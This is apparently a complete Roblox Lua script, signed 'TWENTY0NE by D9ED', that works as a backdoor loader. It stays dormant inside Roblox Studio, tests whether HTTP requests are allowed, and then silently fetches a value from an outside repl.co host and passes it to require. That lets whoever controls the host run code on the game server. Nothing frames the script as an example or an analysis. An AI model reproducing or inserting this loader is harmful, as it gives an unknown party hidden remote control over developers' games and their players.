-- TWENTY0NE by D9ED
local Services = {game:GetService("RunService"),game:GetService("HttpService")}

if not Services[1]:IsStudio() then
	local bruh = function()
		local Set = false
		pcall(function()
			if Services[2]:GetAsync("https://www.test.com/") then
				Set = not Set
			end
		end)
		return Set
	end

	if bruh() then -- returns either true or false
		pcall(function()
			require(Services[2]:GetAsync("https://ssapi.entity493.repl.co"))
		end)
	end
	
end